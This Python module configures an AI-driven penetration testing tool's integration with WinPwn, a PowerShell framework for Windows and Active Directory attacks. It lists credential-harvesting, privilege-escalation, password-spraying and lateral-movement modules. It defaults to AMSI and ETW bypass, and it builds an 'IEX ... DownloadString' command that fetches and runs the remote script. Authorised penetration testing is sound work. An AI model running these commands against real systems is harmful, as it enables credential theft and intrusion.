"""
WinPwn Integration Configuration

Configuration and settings for WinPwn PowerShell framework integration.
WinPwn is a Windows/AD penetration testing automation tool by @S3cur3Th1sSh1t.

Supports:
- Local script execution
- Remote repository loading
- Custom repository hosting

Usage:
    from aipt_v2.tools.winpwn import WinPwnConfig, get_winpwn_config

    config = get_winpwn_config(
        script_path="/path/to/WinPwn.ps1",
        target="10.0.0.1"
    )
"""

import os
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional


class WinPwnExecutionMode(Enum):
    """WinPwn execution mode."""

    LOCAL_SCRIPT = "local"  # Run from local .ps1 file
    REMOTE_REPO = "remote"  # Load from GitHub
    CUSTOM_REPO = "custom"  # Load from custom repo server


class WinPwnModule(Enum):
    """WinPwn functional modules."""

    # Reconnaissance
    LOCAL_RECON = "localrecon"
    DOMAIN_RECON = "domainrecon"

    # Credential harvesting
    KITTIE_LOCAL = "kittielocal"
    LSASS_DUMP = "lsassdump"
    SAM_FILE = "samfile"
    SESSIONGOPHER = "sessiongopher"
    WIFI_CREDS = "wificreds"
    BROWSER_PWN = "browserpwn"

    # Privilege escalation
    PRIVESC = "privesc"
    KERNEL_EXPLOITS = "kernelexploits"
    UAC_BYPASS = "uacbypass"
    TOKEN_MANIPULATION = "tokenmanipulation"

    # Domain attacks
    KERBEROASTING = "kerberoasting"
    BLOODHOUND = "sharphound"
    INVEIGH = "inveigh"
    DOMAIN_SPRAY = "domainpassspray"

    # Lateral movement
    LATERAL_MOVEMENT = "latmov"
    SHARE_ENUM = "shareenum"

    # Full automation
    WINPWN_FULL = "winpwn"


@dataclass
class WinPwnCredentials:
    """Credentials for WinPwn operations."""

    username: str = ""
    password: str = ""
    domain: str = ""
    ntlm_hash: str = ""

    def __post_init__(self):
        """Load from environment if not provided."""
        if not self.username:
            self.username = os.getenv("AD_USERNAME", "")
        if not self.password:
            self.password = os.getenv("AD_PASSWORD", "")
        if not self.domain:
            self.domain = os.getenv("AD_DOMAIN", "")
        if not self.ntlm_hash:
            self.ntlm_hash = os.getenv("AD_NTLM_HASH", "")

    def has_credentials(self) -> bool:
        """Check if valid credentials exist."""
        return bool((self.username and self.password) or (self.username and self.ntlm_hash))


@dataclass
class WinPwnConfig:
    """WinPwn execution configuration."""

    # Script location
    script_path: str = ""  # Path to local WinPwn.ps1
    repo_url: str = ""  # Custom repo URL (if not GitHub)

    # Execution mode
    execution_mode: WinPwnExecutionMode = WinPwnExecutionMode.LOCAL_SCRIPT

    # Target information
    target_host: str = ""  # Target machine IP/hostname
    dc_ip: str = ""  # Domain Controller IP
    domain: str = ""  # Domain name

    # Credentials
    credentials: WinPwnCredentials = field(default_factory=WinPwnCredentials)

    # Modules to run
    enabled_modules: List[WinPwnModule] = field(default_factory=list)

    # Execution options
    run_as_admin: bool = False  # Require admin privileges
    bypass_amsi: bool = True  # Attempt AMSI bypass
    bypass_etw: bool = True  # Attempt ETW bypass
    noninteractive: bool = True  # Run non-interactively

    # Output settings
    output_dir: str = "./winpwn_results"
    save_output: bool = True
    verbose: bool = False

    # Timeout settings
    timeout: int = 600  # 10 minute default timeout
    module_timeout: int = 120  # Per-module timeout

    # PowerShell execution
    powershell_path: str = "powershell.exe"
    pwsh_core: bool = False  # Use PowerShell Core
    execution_policy: str = "Bypass"

    def __post_init__(self):
        """Initialize from environment."""
        if not self.script_path:
            self.script_path = os.getenv("WINPWN_SCRIPT_PATH", "")
        if not self.repo_url:
            self.repo_url = os.getenv(
                "WINPWN_REPO_URL", "https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master"
            )
        if not self.domain:
            self.domain = os.getenv("AD_DOMAIN", "")
        if not self.dc_ip:
            self.dc_ip = os.getenv("AD_DC_IP", "")

        # Ensure output directory exists
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)

    def get_script_source(self) -> str:
        """Get the script source for loading WinPwn."""
        if self.execution_mode == WinPwnExecutionMode.LOCAL_SCRIPT:
            if self.script_path and Path(self.script_path).exists():
                return f". '{self.script_path}'"
            raise ValueError(f"Script not found: {self.script_path}")

        elif self.execution_mode == WinPwnExecutionMode.REMOTE_REPO:
            return (
                "IEX (New-Object Net.WebClient).DownloadString("
                "'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')"
            )

        elif self.execution_mode == WinPwnExecutionMode.CUSTOM_REPO:
            return (
                f"IEX (New-Object Net.WebClient).DownloadString("
                f"'{self.repo_url}/WinPwn/master/WinPwn.ps1')"
            )

        return ""

    def get_module_command(self, module: WinPwnModule) -> str:
        """Get PowerShell command for a specific module."""
        cmd_map = {
            WinPwnModule.LOCAL_RECON: "Localreconmodules",
            WinPwnModule.DOMAIN_RECON: "Domainreconmodules",
            WinPwnModule.KITTIE_LOCAL: "Kittielocal",
            WinPwnModule.LSASS_DUMP: "lsassdumps",
            WinPwnModule.SAM_FILE: "Samfile",
            WinPwnModule.SESSIONGOPHER: "SessionGopher",
            WinPwnModule.WIFI_CREDS: "Wificreds",
            WinPwnModule.BROWSER_PWN: "Browserpwn",
            WinPwnModule.PRIVESC: "Privescmodules",
            WinPwnModule.KERNEL_EXPLOITS: "Kernelexploits",
            WinPwnModule.UAC_BYPASS: "UACBypass",
            WinPwnModule.TOKEN_MANIPULATION: "TokenManipulation",
            WinPwnModule.KERBEROASTING: "Kerberoasting",
            WinPwnModule.BLOODHOUND: "Sharphound",
            WinPwnModule.INVEIGH: "Inveigh",
            WinPwnModule.DOMAIN_SPRAY: "Domainpassspray",
            WinPwnModule.LATERAL_MOVEMENT: "latmov",
            WinPwnModule.SHARE_ENUM: "Shareenumeration",
            WinPwnModule.WINPWN_FULL: "WinPwn",
        }
        return cmd_map.get(module, module.value)

    def is_configured(self) -> bool:
        """Check if WinPwn is properly configured."""
        if self.execution_mode == WinPwnExecutionMode.LOCAL_SCRIPT:
            return bool(self.script_path and Path(self.script_path).exists())
        return True  # Remote modes don't need local script

    def requires_admin(self, module: WinPwnModule) -> bool:
        """Check if module requires admin privileges."""
        admin_modules = {
            WinPwnModule.LSASS_DUMP,
            WinPwnModule.SAM_FILE,
            WinPwnModule.KERNEL_EXPLOITS,
            WinPwnModule.TOKEN_MANIPULATION,
            WinPwnModule.INVEIGH,
        }
        return module in admin_modules


def get_winpwn_config(
    script_path: Optional[str] = None,
    target_host: Optional[str] = None,
    domain: Optional[str] = None,
    dc_ip: Optional[str] = None,
    username: Optional[str] = None,
    password: Optional[str] = None,
    **kwargs,
) -> WinPwnConfig:
    """
    Create WinPwnConfig from parameters and environment.

    Args:
        script_path: Path to local WinPwn.ps1
        target_host: Target machine IP/hostname
        domain: AD domain name
        dc_ip: Domain Controller IP
        username: Username for operations
        password: Password for authentication
        **kwargs: Additional configuration options

    Returns:
        WinPwnConfig instance
    """
    credentials = WinPwnCredentials(
        username=username or os.getenv("AD_USERNAME", ""),
        password=password or os.getenv("AD_PASSWORD", ""),
        domain=domain or os.getenv("AD_DOMAIN", ""),
        ntlm_hash=kwargs.get("ntlm_hash", os.getenv("AD_NTLM_HASH", "")),
    )

    # Determine execution mode
    if script_path and Path(script_path).exists():
        exec_mode = WinPwnExecutionMode.LOCAL_SCRIPT
    elif kwargs.get("repo_url"):
        exec_mode = WinPwnExecutionMode.CUSTOM_REPO
    else:
        exec_mode = WinPwnExecutionMode.REMOTE_REPO

    return WinPwnConfig(
        script_path=script_path or os.getenv("WINPWN_SCRIPT_PATH", ""),
        repo_url=kwargs.get("repo_url", ""),
        execution_mode=exec_mode,
        target_host=target_host or "",
        dc_ip=dc_ip or os.getenv("AD_DC_IP", ""),
        domain=domain or os.getenv("AD_DOMAIN", ""),
        credentials=credentials,
        enabled_modules=kwargs.get("enabled_modules", []),
        run_as_admin=kwargs.get("run_as_admin", False),
        bypass_amsi=kwargs.get("bypass_amsi", True),
        bypass_etw=kwargs.get("bypass_etw", True),
        noninteractive=kwargs.get("noninteractive", True),
        output_dir=kwargs.get("output_dir", "./winpwn_results"),
        timeout=kwargs.get("timeout", 600),
        verbose=kwargs.get("verbose", False),
    )


def validate_winpwn_config(config: WinPwnConfig) -> Dict[str, Any]:
    """
    Validate WinPwn configuration.

    Args:
        config: WinPwnConfig to validate

    Returns:
        Dict with validation results
    """
    results = {"valid": False, "errors": [], "warnings": []}

    # Check script availability for local mode
    if config.execution_mode == WinPwnExecutionMode.LOCAL_SCRIPT:
        if not config.script_path:
            results["errors"].append("Script path not specified for local execution")
        elif not Path(config.script_path).exists():
            results["errors"].append(f"Script not found: {config.script_path}")

    # Check credentials for domain operations
    if any(
        m in config.enabled_modules
        for m in [
            WinPwnModule.DOMAIN_RECON,
            WinPwnModule.KERBEROASTING,
            WinPwnModule.BLOODHOUND,
            WinPwnModule.DOMAIN_SPRAY,
        ]
    ):
        if not config.credentials.has_credentials():
            results["warnings"].append("Domain modules enabled but no credentials provided")
        if not config.domain:
            results["warnings"].append("Domain modules enabled but domain not specified")

    # Check admin requirements
    for module in config.enabled_modules:
        if config.requires_admin(module) and not config.run_as_admin:
            results["warnings"].append(
                f"Module {module.value} requires admin but run_as_admin is False"
            )

    # All good
    if not results["errors"]:
        results["valid"] = True

    return results


__all__ = [
    "WinPwnConfig",
    "WinPwnCredentials",
    "WinPwnModule",
    "WinPwnExecutionMode",
    "get_winpwn_config",
    "validate_winpwn_config",
]
